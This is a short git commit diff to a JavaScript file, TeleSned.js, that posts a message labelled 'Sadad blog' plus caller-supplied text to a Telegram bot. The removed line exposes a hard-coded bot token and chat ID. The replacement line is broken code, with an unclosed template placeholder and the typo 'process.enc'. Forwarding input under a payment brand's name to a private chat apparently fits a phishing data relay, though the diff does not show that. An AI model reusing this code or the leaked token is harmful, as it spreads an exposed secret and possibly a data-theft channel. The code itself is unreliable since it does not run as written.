68d9f83e0c25dd241b897fa15d35bace7a8c6361
Aabwshmys <aabwshmys84@gmail.com>
2024-12-28 02:16:31 +0300

    Update TeleSned.js

--- ‏‏my-app/src/server/TeleSned.js
+++ ‏‏my-app/src/server/TeleSned.js
@@ -5,7 +5,7 @@ export const TeleSned = () => {
 
     const Send = async (des) => {
         const text = `مدونة سداد %0A ${des}`;
-        await axios.post(`https://api.telegram.org/bot7816800104:AAFTIrJL464I3Bq2upGIewtYwb4XHRS_CY4/sendMessage?chat_id=7422741721&text=${text}`)
+        await axios.post(`https://api.telegram.org/bot${process.env.TOKEN/sendMessage?chat_id=process.enc.CHAT_ID&text=${text}`)
     }
   return {
     Send,
